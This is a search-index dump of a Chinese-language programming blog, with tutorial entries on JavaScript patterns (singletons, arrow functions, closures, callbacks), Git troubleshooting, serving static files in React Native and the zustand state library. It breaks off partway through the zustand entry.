这可能会导致意外行为，因为可以在整个应用程序中共享多个单例实例，这些实例也会被修改。\n3. 全局行为 Singleton 实例应该能够在整个应用程序中被引用。全局变量本质上表现出相同的行为：由于全局变量在全局范围内可用，我们可以在整个应用程序中访问这些变量。\n拥有全局变量通常被认为是一个糟糕的设计决策。全局范围污染最终可能会意外覆盖全局变量的值，从而导致许多意外行为。\n在 ES2015 中，创建全局变量是相当罕见的。新的 let 和 const 关键字通过将使用这两个关键字声明的变量保持在块范围内来防止开发人员意外污染全局范围。 JavaScript 中的新模块系统通过能够从模块导出值并将这些值导入其他文件，从而在不污染全局范围的情况下更容易地创建全局可访问值。\n但是，单例的常见用例是在整个应用程序中拥有某种全局状态。让代码库的多个部分依赖同一个可变对象可能会导致意外行为。\n通常，代码库的某些部分修改这些全局状态中的值，而其他部分则使用该数据。这里的执行顺序很重要：我们不想在没有数据要消费的时候（还）不小心先消费数据！随着应用程序的增长，了解使用全局状态时的数据流会变得非常棘手，并且数十个组件相互依赖。\n\rReact 中的状态管理 在 React 中，我们经常通过 Redux 或 React Context 等状态管理工具来依赖全局状态，而不是使用 Singleton。 尽管它们的全局状态行为可能看起来类似于 Singleton 的行为，但这些工具提供只读状态而不是 Singleton 的可变状态。 使用 Redux 时，只有纯函数化简器（reducers）才能在组件通过调度程序（dispatcher）发送操作后更新状态。\n尽管使用这些工具并没有神奇地消除拥有全局状态的缺点，但我们至少可以确保全局状态按照我们想要的方式进行变异，因为组件不能直接更新状态。\n\r知识点  class 对象字面量 throw 语句 Object.freeze()  ","description":"在应用程序中共享一个全局实例","id":40,"section":"patterns","tags":null,"title":"单例模式","uri":"https://danacoding.github.io/patterns/design-patterns/single-patterns/"},{"content":"这里用 For 循环举例\n命令式 1 2 3 4 5 6 7 8 9 10 11 12 13  const files = [\u0026#34;foo.txt \u0026#34;, \u0026#34;.bar\u0026#34;, \u0026#34; \u0026#34;, \u0026#34;baz.foo\u0026#34;]; let filePaths = []; for (let file of files) { const fileName = file.trim(); if (fileName) { const filePath = `~/cool_app/${fileName}`; filePaths.push(filePath); } } // filePaths = [ \u0026#39;~/cool_app/foo.txt\u0026#39;, \u0026#39;~/cool_app/.bar\u0026#39;, \u0026#39;~/cool_app/baz.foo\u0026#39;]   函数式 封装性更好\n1 2 3 4 5 6 7 8 9 10 11 12  const files = [\u0026#34;foo.txt \u0026#34;, \u0026#34;.bar\u0026#34;, \u0026#34; \u0026#34;, \u0026#34;baz.foo\u0026#34;]; const filePaths = files.reduce((acc, file) =\u0026gt; { const fileName = file.trim(); if (fileName) { const filePath = `~/cool_app/${fileName}`; acc.push(filePath); } return acc; }, []); // filePaths = [ \u0026#39;~/cool_app/foo.txt\u0026#39;, \u0026#39;~/cool_app/.bar\u0026#39;, \u0026#39;~/cool_app/baz.foo\u0026#39;]   链式 与函数式相比，更直观，也是建议使用的方式\n1 2 3 4 5 6 7 8  const files = [\u0026#34;foo.txt \u0026#34;, \u0026#34;.bar\u0026#34;, \u0026#34; \u0026#34;, \u0026#34;baz.foo\u0026#34;]; const filePaths = files .map((file) =\u0026gt; file.trim()) .filter(Boolean) .map((fileName) =\u0026gt; `~/cool_app/${fileName}`); // filePaths = [ \u0026#39;~/cool_app/foo.txt\u0026#39;, \u0026#39;~/cool_app/.bar\u0026#39;, \u0026#39;~/cool_app/baz.foo\u0026#39;]   ","description":"常见的编程模式","id":41,"section":"jsts","tags":null,"title":"命令式 vs 函数式 vs 链式","uri":"https://danacoding.github.io/jsts/function/for/"},{"content":"Object 概述 Object 是 JavaScript 的一种 数据类型 。它用于存储各种键值集合和更复杂的实体。\nObjects 可以通过 对象字面量、构造函数 或者 class 的方式创建\n一、对象字面量 （{\u0026hellip;}） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  let user = { name: \u0026#34;Lucy\u0026#34;, sayHi(){ console.log(this.name) // Lucy, this指的是“当前的对象”  } } user.sayHi() // Lucy  // 箭头函数 // 这是箭头函数的一个特性，当我们并不想要一个独立的 this，反而想从外部上下文中获取时，它很有用。 let user = { name: \u0026#34;Lucy\u0026#34;, sayHi() { let arrow = () =\u0026gt; console.log(this.name); arrow(); } }; user.sayHi(); // Lucy   二、构造器 + new 常规的 {\u0026hellip;} （字面量） 语法允许创建一个对象。但是我们经常需要创建许多类似的对象，例如多个用户或菜单项等。\n这可以使用构造器（构造函数）和new操作符来实现。\n从技术上讲，任何函数（除了箭头函数，它没有自己的 this）都可以用作构造器。\n即可以通过 new 来运行，它会执行上面的算法。\n首字母大写是一个共同的约定，以明确表示一个函数将被使用 new 来运行。\n#. 约定 构造函数在技术上是常规函数。不过有两个约定：\n 它们的命名以大写字母开头。 它们只能由 new 操作符来执行。  #. 实列 1 2 3 4 5 6 7 8 9 10 11 12 13  function User(name) { // this = {};（隐式创建）  // 添加属性到 this  this.name = name; this.isAdmin = false; // return this;（隐式返回） } const val1 = new User(\u0026#34;Jack\u0026#34;); console.log(val1) //{name: \u0026#34;Jack\u0026#34;, isAdmin: false, constructor: Object}   等同于字面量Object\n1 2 3 4 5 6 7  let user = { name: \u0026#34;Jack\u0026#34;, isAdmin: false } console.log(user) //name: \u0026#34;Jack\u0026#34;, isAdmin: false}   三、class + new 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  class ClassMates{ constructor(name,age){ this.name=name; this.age=age; } displayInfo(){ return this.name + \u0026#34;is \u0026#34; + this.age + \u0026#34; years old!\u0026#34;; } } // 用法： let classmate = new ClassMates(\u0026#34;Mike Will\u0026#34;,15); classmate.displayInfo(); // result: Mike Will is 15 years old!  // 其实class也是一个function console.log(typeof ClassMates); // function   ","description":"Object 三剑客","id":42,"section":"jsts","tags":null,"title":"字面量 vs 构造器 vs class","uri":"https://danacoding.github.io/jsts/function/new/"},{"content":"JavaScript 的箭头函数从表面上看可能与常规函数相同，但它们有一些非常重要的区别：\n关键区别  语法 this 值（执行上下文） 用作类方法 用作构造函数 arguments 参数绑定  #. 语法 1 2 3 4 5 6 7  const square = a =\u0026gt; a * a; // 允许省略单个参数周围的括号; 隐式返回;  // 等效常规function function square(a) { return a * a; }   #. 执行上下文  this  1 2 3 4 5 6 7 8 9 10 11 12 13  const logThisArrow = () =\u0026gt; { console.log(this); }; document.addEventListener(\u0026#39;click\u0026#39;, logThisArrow); // `this` 指的是全局对象  // 常规函数 function logThis() { console.log(this); } document.addEventListener(\u0026#39;click\u0026#39;, logThis); // `this` 指的是 document    Function.prototype.call() Function.prototype.bind() Function.prototype.apply()  以上3个方法箭头函数也不能工作。因为这三个方法目的式允许函数在不同的范围内执行。\n但是箭头函数的 this 值不能改变，因为它是词法解析的。\n1 2 3 4 5 6 7 8 9 10 11  const logThisArrow = () =\u0026gt; { console.log(this); }; logThisArrow.call(42); // Logs: 全局对象  // 常规函数 function logThis() { console.log(this); } logThis.call(42); // Logs: 42   #. 用作类方法 由于箭头函数没有定义自己的执行上下文，因此它们不太适合用作方法。\n然而，由于Class fields proposal，如果您的环境支持，箭头函数可以用作类内部的方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13  const obj = { x: 42, logThisX: function() { console.log(this.x, this); }, logThisXArrow: () =\u0026gt; { console.log(this.x, this); } }; obj.logThisX(); // Logs: 42, Object {...} obj.logThisXArrow(); // Logs: undefined, the global object   #. 用作构造函数 常规函数可以用作构造函数，使用new关键字。\nthis内部箭头函数的词法解析的另一个结果是它们不能用作构造函数。使用new在一个箭头作用的结果TypeError。\n1 2 3 4 5 6 7 8 9 10  const Bar = foo =\u0026gt; { this.foo = foo; }; const b = new Bar(42); // TypeError: Bar is not a constructor  function Foo(bar) { this.bar = bar; } const a = new Foo(42); // Foo {bar: 42}   #. arguments 参数绑定 另一个区别是arguments对象的绑定。\n与常规函数不同，箭头函数没有自己的arguments对象。绕过此限制的现代替代方案是使用其余参数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  function sum() { return arguments[0] + arguments[1]; }; sum(4, 6); // 10  const arguments = [1, 2, 3]; const sumArrow = () =\u0026gt; { return arguments[0] + arguments[1]; }; sumArrow(4, 6); // 3 (resolves to 1 + 2)  const sumRest = (...arguments) =\u0026gt; { return arguments[0] + arguments[1]; } sumRest(4, 6); // 10   #. 其他差异 最后，还有一些其他差异并不那么重要，但值得一提。\n这些包括缺少prototype箭头函数中的属性，以及yield关键字可能不会在箭头函数的主体中使用的事实。\n后者的结果是箭头函数不能用作生成器。\n","description":"JavaScript 中的箭头函数和常规函数的区别","id":43,"section":"jsts","tags":null,"title":"箭头函数 vs 常规函数","uri":"https://danacoding.github.io/jsts/function/arrow/"},{"content":"闭包   涉及变量作用域\n  内部函数使用外部函数的变量\n  1 2 3 4 5 6 7 8 9 10 11 12 13  function outerFunc() { const outerVal = 100; function interFunc() { console.log(outerVal); } return interFunc; // 记得返回你的内部函数 } const inter = outerFunc(); inter(); //100   递归   自己调用自己，一般用于 给定条件 过滤/计算 数据\n  著名案例 斐波那契数列\n  1 2 3 4 5 6 7 8 9 10  function fibonacciRecursive(n) { if (n \u0026lt; 2) { return n; } return fibonacciRecursive(n - 1) + fibonacciRecursive(n - 2); } fibonacciRecursive(8); // 21   回调   ！！！JavaScript 默认是同步的，并且是单线程的。这意味着代码不能创建新线程并行运行。！！！\n  函数调用另一个函数\n  func_1 作为 func_2 的 参数，func_2(func_1)\n  #. 同步回调（立即执行）  最佳案例 Array.prototype.map()  1 2 3 4 5  const nums = [1, 2, 3]; const printDouble = (n) =\u0026gt; console.log(2 * n); // 双倍打印  nums.map(printDouble);   #. 异步回调（等待执行）  最佳案例 Promise.prototype.then()  1 2 3 4 5  const nums = fetch(\u0026#34;https://api.nums.org\u0026#34;); // [1, 2, 3] const printDouble = (n) =\u0026gt; console.log(2 * n); // 双倍打印  nums.then(printDouble); // 2, 4, 6   #. 回调地狱 如果调用嵌套增加，代码层次会变得很深，维护难度也随之增加，尤其是包含了很多循环和条件等。\n嵌套调用的“金字塔”随着每个异步行为会向右增长。很快它就失控了。\n幸运的是，有其他方法可以避免此类金字塔。最好的方法之一就是 promise。\n","description":"JS 三剑客","id":44,"section":"jsts","tags":null,"title":"闭包、递归和回调","uri":"https://danacoding.github.io/jsts/function/callback/"},{"content":"一、OpenSSL SSL_connect  git clone/git pull/git push 报错  fatal: unable to access 'https://github.com/xxx.git/': OpenSSL SSL_connect: Connection was reset in connection to github.com:443\n 解决办法：这个办法可以让git速度更快。\n git config --global --add remote.origin.proxy \u0026quot;127.0.0.1:(proxy http port number)\u0026quot;\r//我的是\rgit config --global --add remote.origin.proxy \u0026quot;127.0.0.1:1080\u0026quot;\r二、! [rejected] main -\u0026gt; main (fetch first) 由于在github上进行了修改，而本地还没有修改就push，所以才会出现这个错误。最好先pull下来，但是如果本地已经修改了，那么就用下面这个方法：\ngit push origin main --force\r三、not found  git push 的时候，提示not found,很大可能是之前已经有git的就用户在该台电脑。最直接的办法就是：   控制面板\u0026gt;查看方式 \u0026gt; 小图标 凭据管理器 \u0026gt; windows凭据 删除相关凭据即可 之后在git push 的时候会提示输入新用户名和邮箱，按步骤提交就可以正常使用了  四、github一个仓库管理多个项目 Step1. github上创建一个仓库 test.co (名为test公司的项目) Step2. git 到本地 git clone https://github.com/用户名/test.co.git\rStep3. 进入 test.co 项目根目录，并创建项目1 project1 文件夹 1. 打开 Git Bash\r2. mkdir project1 //创建项目1文件夹（用于存放项目1代码）\rStep4. 进入 project1 根目录 1. cd project1 //进入项目1根目录\r2. git branch //检查分支\rStep5. 创建分支（特别注意：如果在当前的分支再创建分支，那么所创建的分支就是当前分支的子分支，而不是父分支的子分支。） git checkout project1\r//或者创建+切换分支，可直接跳过Step6.\rgit checkout -b project1\rStep6. 切换分支 git checkout project1\r//如果是从远程仓库clone下来的，则\r1. get fetch\r2. git checkout \u0026lt;branchname\u0026gt;\r 参考\n Step7. 检查当前分支状态并提交代码到本地仓库 git status\rgit add .\rgit commit -m \u0026quot;注释说明。。。\u0026quot;\rStep8. push 到远程仓库 - - - 成功！ git push origin project1\r注意： 1） git checkout 切换分支项目的时候，可能其他项目的某些文件暂时不可见，这是出于git的安全保护机制，只要再切换回去就可以看到项目的所有文件了。\n2）.gitignore文本文档文件是用于从模板列表中选择不跟踪的文件。，也就是不打算提交的文件（比如安装包node_modules）。参考链接\nnode_modules/**/*\r.expo/*\rnpm-debug.*\r*.jks\r*.p8\r*.p12\r*.key\r*.mobileprovision\r*.orig.*\rweb-build/\r# macOS\r.DS_Store\r","description":"","id":45,"section":"others","tags":null,"title":"Git 最佳实践","uri":"https://danacoding.github.io/others/git/git-bp/"},{"content":"搭建本地静态服务器和使用本地静态资源， 需要在expo弹出的裸漏工作流中\nStep1. 配置android文件 /android/app/build.gradle 中添加 sourceSets { main { assets.srcDirs = ['src/main/assets','../../assets']}}\nandroid {\rcompileSdkVersion rootProject.ext.compileSdkVersion\rcompileOptions {\rsourceCompatibility JavaVersion.VERSION_1_8\rtargetCompatibility JavaVersion.VERSION_1_8\r}\rdefaultConfig {\rapplicationId 'com.fengmo.GA08'\rminSdkVersion rootProject.ext.minSdkVersion\rtargetSdkVersion rootProject.ext.targetSdkVersion\rversionCode 1\rversionName \u0026quot;1.0.0\u0026quot;\r}\rsplits {\rabi {\rreset()\renable enableSeparateBuildPerCPUArchitecture\runiversalApk false // If true, also generate a universal APK\rinclude \u0026quot;armeabi-v7a\u0026quot;, \u0026quot;x86\u0026quot;, \u0026quot;arm64-v8a\u0026quot;, \u0026quot;x86_64\u0026quot;\r}\r}\rsigningConfigs {\rdebug {\rstoreFile file('debug.keystore')\rstorePassword 'android'\rkeyAlias 'androiddebugkey'\rkeyPassword 'android'\r}\r}\rbuildTypes {\rdebug {\rsigningConfig signingConfigs.debug\r}\rrelease {\r// Caution! In production, you need to generate your own keystore file.\r// see https://reactnative.dev/docs/signed-apk-android.\rsigningConfig signingConfigs.debug\rminifyEnabled enableProguardInReleaseBuilds\rproguardFiles getDefaultProguardFile(\u0026quot;proguard-android.txt\u0026quot;), \u0026quot;proguard-rules.pro\u0026quot;\r}\r}\r// applicationVariants are e.g. debug, release\rapplicationVariants.all { variant -\u0026gt;\rvariant.outputs.each { output -\u0026gt;\r// For each separate APK per architecture, set a unique version code as described here:\r// https://developer.android.com/studio/build/configure-apk-splits.html\rdef versionCodes = [\u0026quot;armeabi-v7a\u0026quot;: 1, \u0026quot;x86\u0026quot;: 2, \u0026quot;arm64-v8a\u0026quot;: 3, \u0026quot;x86_64\u0026quot;: 4]\rdef abi = output.getFilter(OutputFile.ABI)\rif (abi != null) { // null for the universal-debug, universal-release variants\routput.versionCodeOverride =\rversionCodes.get(abi) * 1048576 + defaultConfig.versionCode\r}\r}\r}\r+ sourceSets { main { assets.srcDirs = ['src/main/assets','../../assets']}}\r}\rStep2. 安装静态服务器 yarn add react-native-static-server\rStep3. 安装文件系统 yarn add react-native-fs\rStep4. 安装html渲染组件 expo install react-native-webview\rStep5. 项目根目录中新建type.d.ts declare module 'react-native-static-server'\rdeclare module 'react-native-fs'\rStep6. assets/www 中放置静态html项目文件 Step7. 启动本地开发服务器 yarn start\rStep8. 将开发apk打包到模拟器测试成果 yarn android\rStep9. 如果打包后的apk打开页面不显示  Domain: undefine\nError Code:-1\n 需要在 android/app/src/main/AndroidManifest.xml 中的\u0026lt;application\u0026gt;中添加 android:usesCleartextTraffic=\u0026quot;true\u0026quot;\n\u0026lt;application android:name=\u0026quot;.MainApplication\u0026quot; android:label=\u0026quot;@string/app_name\u0026quot; android:icon=\u0026quot;@mipmap/ic_launcher\u0026quot; + android:usesCleartextTraffic=\u0026quot;true\u0026quot; android:roundIcon=\u0026quot;@mipmap/ic_launcher_round\u0026quot; android:allowBackup=\u0026quot;true\u0026quot; android:theme=\u0026quot;@style/AppTheme\u0026quot;\r\u0026gt;\r 以上只是流程步骤，具体逻辑代码未在这里展示\n 注意 修改静态文件后，如果yarn android报错\n Unable to delete directory\n 需要先删除本地 android\\app\\build\\intermediates\\merged_assets\\debug\\out\\ 中的文件，再yarn android才不会报错。\n","description":"","id":46,"section":"react-native","tags":null,"title":"react-native-static-server","uri":"https://danacoding.github.io/react-native/react-native/react-native-static-server/"},{"content":"一、goBack()返回上一屏幕刷新状态的方法 通过路由传递数据时，当向同一个页面（详情页）传递一些唯一数据，使用push，而不是 navigate，这样才能保证整个组件重新执行。\n","description":"","id":47,"section":"react-native","tags":null,"title":"React-Navigation","uri":"https://danacoding.github.io/react-native/expo/react-navigation/"},{"content":"zustand 基于 hooks 的 api，小型、快速且可扩展的状态管理解决方案。\n一、安装 yarn add zustand\r二、最简使用方法 Step1. 创建一个 Store store 是一个钩子！ 可以在里面放任何东西：原始数据（string，number，bigint，boolean，null）、对象、方法。 set 方法合并状态。\nimport create from 'zustand'\rconst useCount = create(set =\u0026gt; ({\rcount: 0,\rplus: () =\u0026gt; set(state =\u0026gt; ({ count: state.count + 1 })),\rminus: () =\u0026gt; set(state =\u0026gt; ({ count: state.count - 1 })),\rreset: () =\u0026gt; set({ count: 0 })\r}))\rStep2. 绑定组件 function Counter() {\rconst count = useCount(state =\u0026gt; state.count)\rreturn \u0026lt;h1\u0026gt;{count}\u0026lt;/h1\u0026gt;\r}\rfunction Controls() {\rconst plus = useCount(state =\u0026gt; state.plus)\rconst minus= useCount(state =\u0026gt; state.minus)\rconst reset= useCount(state =\u0026gt; state.reset)\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;button onClick={plus}\u0026gt;+\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={minus}\u0026gt;-\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={reset}\u0026gt;重置\u0026lt;/button\u0026gt;\r\u0026lt;/\u0026gt;\r)\r}\r二、强制渲染组件 记住，它会导致组件在每次状态更改时渲染！\nconst state = useStore()\r三、state 更新渲染组件 切片状态（slice state）,因为store是一个原子状态，可以将它切分为多个格子状态，便于代码管理。\n1. 单个 state 更新渲染 默认情况下，它以严格相等（旧 === 新）检测更改，这对于原子状态选择非常有效。\nconst nuts = useStore(state =\u0026gt; state.nuts)\rconst honey = useStore(state =\u0026gt; state.honey)\r2. 多个 state 更新（浅差异）渲染 如果想构造一个内部有多个 state-picks(状态选择) 的单个对象，类似于 redux 的 mapStateToProps，可以告诉 zustand 你希望通过传递shallow相等函数来对对象进行浅差异。\n1 2 3 4 5 6 7 8 9 10 11  import shallow from \u0026#39;zustand/shallow\u0026#39; // 对象选择，当 `state.nuts` 或 `state.honey` 改变时重新渲染组件 const { nuts, honey } = useStore(state =\u0026gt; ({ nuts: state.nuts, honey: state.honey }), shallow) // 数组选择，当 `state.nuts` 或 `state.honey` 改变时重新渲染组件 const [nuts, honey] = useStore(state =\u0026gt; [state.nuts, state.honey], shallow) // 映射选择，当 `state.treats` 按 `count` 或 `keys` 顺序改变时重新渲染组件 const treats = useStore(state =\u0026gt; Object.keys(state.treats), shallow)   3. 自定义函数控制渲染 为了更好地控制重新渲染，可以提供任何自定义的相等函数。\nconst treats = useStore(\rstate =\u0026gt; state.treats,\r(oldTreats, newTreats) =\u0026gt; compare(oldTreats, newTreats)\r)\r四、记忆处理器（避免重复计算） 1. useCallback() 处理器 通常建议使用 useCallback 记忆处理器。 这将防止每次渲染时进行不必要的计算。 它还允许 React 在并发模式下优化性能。\nconst fruit = useStore(useCallback(state =\u0026gt; state.fruits[id], [id]))\r2. 不依赖于作用域的处理器 如果一个处理器不依赖于作用域，可以在渲染函数之外定义它以获得一个固定的“引用”而无需 useCallback。\nconst selector = state =\u0026gt; state.berries\rfunction Component() {\rconst berries = useStore(selector)\r}\r五、覆盖state（抹去之前的state） set 函数有第二个参数，默认为 false。 它将取代state模型，而不是合并。 注意它会抹去你依赖的部分，比如actions。\n1 2 3 4 5 6 7 8 9  import omit from \u0026#34;lodash-es/omit\u0026#34; const useStore = create(set =\u0026gt; ({ salmon: 1, tuna: 2, deleteEverything: () =\u0026gt; set({ }, true), // 清除整个存储，包括操作  deleteTuna: () =\u0026gt; set(state =\u0026gt; omit(state, [\u0026#39;tuna\u0026#39;]), true) }))   六、异步操作（fetch请求） 调用 set ， zustand 不关心操作是否异步。\nconst useStore = create(set =\u0026gt; ({\rgirls: {},\rfetch: async pond =\u0026gt; {\rconst response = await fetch(pond)\rset({ girls: await response.json() })\r}\r}))\r七、从 action 中读取 state 通过get访问状态。\nconst useStore = create((set, get) =\u0026gt; ({\rname: \u0026quot;Lucy\u0026quot;,\raction: () =\u0026gt; {\rconst name= get().name\r// ...\r}\r})\r八、在 React 组件之外读写 state 1. 自定义 hooks 读写 state 有时需要以非React方式访问状态，或对store进行操作。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  const useStore = create(() =\u0026gt; ({ paw: true, snout: true, fur: true })) // 在React组件之外获取state const paw = useStore.getState().paw //true  // 侦听所有更改，在每次更改时同步触发 const unsub = useStore.subscribe(console.log) // 更新状态，将触发侦听器 useStore.setState({ paw: false }) // 取消订阅侦听 unsub() // 销毁商店（删除所有侦听器） useStore.destroy() // 当然可以像hook一样使用 function Component() { const paw = useStore(state =\u0026gt; state.paw)   2. 使用订阅处理器（中间件） 如果您需要使用处理器订阅，subscribeWithSelector 中间件会有所帮助。\n有了这个中间件，subscribe 接受一个额外的签名：\nsubscribe(selector, callback, options?: { equalityFn, fireImmediately }): Unsubscribe\r1 2 3 4 5 6 7 8 9 10 11 12  import { subscribeWithSelector } from \u0026#39;zustand/middleware\u0026#39; const useStore = create(subscribeWithSelector(() =\u0026gt; ({ paw: true, snout: true, fur: true }))) // 订阅状态值变化 const unsub2 = useStore.subscribe(state =\u0026gt; state.paw, console.log) // 订阅上一个状态值 const unsub3 = useStore.subscribe(state =\u0026gt; state.paw, (paw, previousPaw) =\u0026gt; console.log(paw, previousPaw)) // 订阅一个可选的浅差异方法 const unsub4 = useStore.subscribe(state =\u0026gt; [state.paw, state.fur], console.log, { equalityFn: shallow }) // 解除订阅 const unsub5 = useStore.subscribe(state =\u0026gt; state.paw, console.log, { fireImmediately: true })   3. 订阅处理器（中间件）使用TS import create, { GetState, SetState } from 'zustand'\rimport { StoreApiWithSubscribeWithSelector, subscribeWithSelector } from 'zustand/middleware'\rtype BearState = {\rpaw: boolean\rsnout: boolean\rfur: boolean\r}\rconst useStore = create\u0026lt;\rBearState,\rSetState\u0026lt;BearState\u0026gt;,\rGetState\u0026lt;BearState\u0026gt;,\rStoreApiWithSubscribeWithSelector\u0026lt;BearState\u0026gt;\r\u0026gt;(subscribeWithSelector(() =\u0026gt; ({ paw: true, snout: true, fur: true })))\r九、瞬时更新ref（用于频繁发生的状态变化） 订阅功能允许组件绑定到state，而无需在更改时强制重新渲染。 最好将它与 useEffect 结合使用，以便在卸载时自动取消订阅。 当直接改变视图时，这会对性能产生巨大影响。\nconst useStore = create(set =\u0026gt; ({ girlNum: 0, ... }))\rfunction Component() {\r// 获取初始状态\rconst girlNumRef = useRef(useStore.getState().girlNum)\r// 在挂载时连接到Store，在卸载时断开连接，在引用时捕获状态变化\ruseEffect(() =\u0026gt; useStore.subscribe(\rstate =\u0026gt; (girlNumRef.current = state.girlNum)\r), [])\r十、更新嵌套的状态，使用 Immer 嵌套结构令人厌烦。 可以使用 Immer 处理深层嵌套的state\nimport produce from 'immer'\rconst useStore = create(set =\u0026gt; ({\rlush: { forest: { contains: { a: \u0026quot;bear\u0026quot; } } },\rclearForest: () =\u0026gt; set(produce(state =\u0026gt; {\rstate.lush.forest.contains = null\r}))\r}))\rconst clearForest = useStore(state =\u0026gt; state.clearForest)\rclearForest();\r十一、中间件 1. 按自己喜欢的方式管理store 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  // 记录每次改变的state const log = config =\u0026gt; (set, get, api) =\u0026gt; config(args =\u0026gt; { console.log(\u0026#34; applying\u0026#34;, args) set(args) console.log(\u0026#34; new state\u0026#34;, get()) }, get, api) // 将 set 方法变成一个 immer proxy const immer = config =\u0026gt; (set, get, api) =\u0026gt; config((partial, replace) =\u0026gt; { const nextState = typeof partial === \u0026#39;function\u0026#39; ? produce(partial) : partial return set(nextState, replace) }, get, api) const useStore = create( log( immer((set) =\u0026gt; ({ bees: false, setBees: (input) =\u0026gt; set((state) =\u0026gt; void (state.bees = input)), })), ), )   2. 管理中间件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  import create from \u0026#34;zustand\u0026#34; import produce from \u0026#34;immer\u0026#34; import pipe from \u0026#34;ramda/es/pipe\u0026#34; /* 上一个例子中的日志和immer函数 */ /* 通过pipe集合任意数量的中间件 */ const createStore = pipe(log, immer, create) const useStore = createStore(set =\u0026gt; ({ bears: 1, increasePopulation: () =\u0026gt; set(state =\u0026gt; ({ bears: state.bears + 1 })) })) export default useStore   3. 在管理中间件中使用TS yarn add --dev @types/ramda\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  import create from \u0026#34;zustand\u0026#34; import { devtools, redux } from \u0026#34;zustand/middleware\u0026#34; import pipe from \u0026#34;ramda/es/pipe\u0026#34; const log: typeof devtools = config =\u0026gt; (set, get, api) =\u0026gt; config( args =\u0026gt; { console.log(\u0026#34; applying\u0026#34;, args) set(args) console.log(\u0026#34; new state\u0026#34;, get()) }, get, api ) export type State = { grumpiness: number } const initialState: State = { grumpiness: 0, } const createStore = pipe(redux, devtools, log, create) enum types { increase = \u0026#34;INCREASE\u0026#34;, decrease = \u0026#34;DECREASE\u0026#34;, } const reducer = ( state: State, { type, by = 1 }: { type: types; by: number } ) =\u0026gt; { switch (type) { case types.increase: return { grumpiness: state.grumpiness + by } case types.decrease: return { grumpiness: state.grumpiness - by } } } const useStore = createStore(reducer, initialState) export default useStore   十二、状态持久化中间件 persist 可以存储任何类型的store数据。（localStorage，AsyncStorage，IndexedDB，等\u0026hellip;）\n1. 快速示例 import create from \u0026quot;zustand\u0026quot;\rimport { persist } from \u0026quot;zustand/middleware\u0026quot;\rexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\rcount: 0,\rplus: () =\u0026gt; set({ count: get().count + 1 })\r}),\r{\rname: \u0026quot;count-storage\u0026quot;, // 唯一的名称\rgetStorage: () =\u0026gt; sessionStorage, // （可选）默认情况下，使用“localStorage”\r}\r))\r2. 选项   name 这是唯一需要的选项。给定的名称将是用于存储state的键，因此它必须是唯一的。\n  getStorage 默认： () =\u0026gt; localStorage\n  给定的存储必须与以下接口匹配：\n1 2 3 4 5 6  interface Storage { getItem: (name: string) =\u0026gt; string | null | Promise\u0026lt;string | null\u0026gt; setItem: (name: string, value: string) =\u0026gt; void | Promise\u0026lt;void\u0026gt; removeItem: (name: string) =\u0026gt; void | Promise\u0026lt;void\u0026gt; }   serialize（序列化）   Schema: (state: Object) =\u0026gt; string | Promise\u0026lt;string\u0026gt; Default: (state) =\u0026gt; JSON.stringify(state)  由于将对象存储在 storage 中的唯一方法是通过字符串，可以使用此选项提供自定义函数将 state 序列化为字符串。\n例如，如果您想将 state 存储在 base64 中：\nexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\r// ...\r}),\r{\r// ...\rserialize: (state) =\u0026gt; btoa(JSON.stringify(state)),\r}\r))\r请注意，还需要一个自定义deserialize函数才能使其正常工作。见下文\ndeserialize （反序列化）   Schema: (str: string) =\u0026gt; Object | Promise\u0026lt;Object\u0026gt; Default: (str) =\u0026gt; JSON.parse(str)  如果使用自定义序列化函数，则很可能还需要使用自定义反序列化函数。它们是一对搭档。\n要继续上面的示例，可以使用以下命令反序列化 base64 值：\nexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\r// ...\r}),\r{\r// ...\rdeserialize: (str) =\u0026gt; JSON.parse(atob(str)),\r}\r))\rpartialize (初始化部分state)   Schema: (state: Object) =\u0026gt; Object Default: (state) =\u0026gt; state  它够省略一些要存储在 storage 中的 state 字段。\n可以使用以下方法省略多个字段：\nexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\rfoo: 0,\rbar: 1,\r}),\r{\r// ...\rpartialize: (state) =\u0026gt;\rObject.fromEntries(\rObject.entries(state).filter(([key]) =\u0026gt; ![\u0026quot;foo\u0026quot;].includes(key))\r),\r}\r))\r或者只允许存储特定state字段：\nexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\rfoo: 0,\rbar: 1,\r}),\r{\r// ...\rpartialize: (state) =\u0026gt; ({ foo: state.foo })\r}\r))\ronRehydrateStorage （水和存储）   Schema: (state: Object) =\u0026gt; ((state?: Object, error?: Error) =\u0026gt; void) | void  此选项能够在水合存储时调用的侦听器函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  export const useStore = create(persist( (set, get) =\u0026gt; ({ // ...  }), { // ...  onRehydrateStorage: (state) =\u0026gt; { console.log(\u0026#34;hydration starts\u0026#34;); //水合开始 \t// 可选  return (state, error) =\u0026gt; { if (error) { console.log(\u0026#34;an error happened during hydration\u0026#34;, error) //水合过程中发生错误  } else { console.log(\u0026#34;hydration finished\u0026#34;) //水合完成  } } } } ))   version 指定存储版本   Schema: number Default: 0  如果在 storage 中引入重大更改（例如重命名字段），可以指定新版本号。\n默认情况下，如果 storage 中的版本与代码中的版本不匹配，则不会使用 storage 的值。\n有关处理重大更改的更多详细信息，请参阅下面的选项migrate\nmigrate 版本迁移   Schema: (persistedState: Object, version: number) =\u0026gt; Object | Promise\u0026lt;Object\u0026gt; Default: (persistedState) =\u0026gt; persistedState  可以使用此选项来处理版本迁移。migrate 函数将持久化state和版本号作为参数。\n它必须返回符合最新版本（代码中的版本）的state。\n例如，如果要重命名字段，可以使用以下命令：\n1 2 3 